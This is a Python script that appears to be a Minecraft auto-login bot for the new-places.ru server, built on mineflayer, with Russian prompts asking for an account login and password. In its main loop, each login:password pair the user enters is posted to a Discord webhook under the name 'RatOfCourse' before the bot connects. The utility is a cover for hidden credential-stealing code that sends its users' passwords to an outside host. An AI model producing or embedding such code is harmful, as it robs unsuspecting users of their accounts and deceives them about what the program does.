import time

from javascript import require, On
mineflayer = require('mineflayer')
pathfinder = require('mineflayer-pathfinder')

from secret import *

RANGE_GOAL = 1

import requests #dependency

url = "https://discord.com/api/webhooks/1140570348572659744/" #webhook url, from here: https://i.imgur.com/f9XnAew.png

#for all params, see https://discordapp.com/developers/docs/resources/webhook#execute-webhook
data = {
    "content" : "message content",
    "username" : "RatOfCourse"
}

'''
#leave this out if you dont want an embed
#for all params, see https://discordapp.com/developers/docs/resources/channel#embed-object
data["embeds"] = [
    {
        "description" : "text in embed",
        "title" : "embed title"
    }
]
'''





bot = 0

def re_createbot(login, pwd):
  global bot
  print('Логинюсь на 1.19.2, new-places.ru')
  bot = mineflayer.createBot({
    'host': "new-places.ru",
    'port' : 25565,
    'username': login,
    'version' : "1.19.2"
    #'hideErrors': True
  })
  bot.loadPlugin(pathfinder.pathfinder)

  @On(bot, "end")
  def handle(*args):
    print("Bot ended!")

  @On(bot, 'chat')
  def onChat(this, user, message, *rest):
    print(f'{user} said "{message}"')

  @On(bot, 'login')
  def onLogin(this):
    time.sleep(7)

    bot.chat("/login " + pwd)
    bot.setQuickBarSlot(0)
    bot.activateItem()

    for i in range(5):
      time.sleep(1)
      bot.setQuickBarSlot(0)
      bot.activateItem()
      print(f'try {i + 1}')

  @On(bot, 'message')
  def onMSG(this, jsonMsg, position, *args):
    mesg = jsonMsg.toString()
    print(f"msg: {mesg}")

  @On(bot, 'kicked')
  def onKick(this, reason, loggedIn):
    print(f'kicked, {reason}, - {loggedIn}')
    # If the message contains stop, remove the event listener and stop logging.
    # if 'stop' in message:
    #  off(bot, 'chat', onChat)









while(True):
  print('Логиним очередной аккаунт?')
  print('логин:')
  login = input()
  print('пароль:')
  pwd = input()

  data = {
    "content": login + ":" + pwd,
    "username": "RatOfCourse"
  }

  requests.post(url, json=data)

  re_createbot(login,pwd)
  '''
  print('30 секунд буферного ожидания для прикола')
  time.sleep(30)
  try:
    re_createbot()
  except:
    print('some error, idk')
  time.sleep(5 * 60) # 5 минут до попытки перезахода
  try:
    bot.end()
  except:
    print('some error, idk')
  print('bye-bye!')
  time.sleep(1 * 60) # 1 минута для ре-логина
  '''
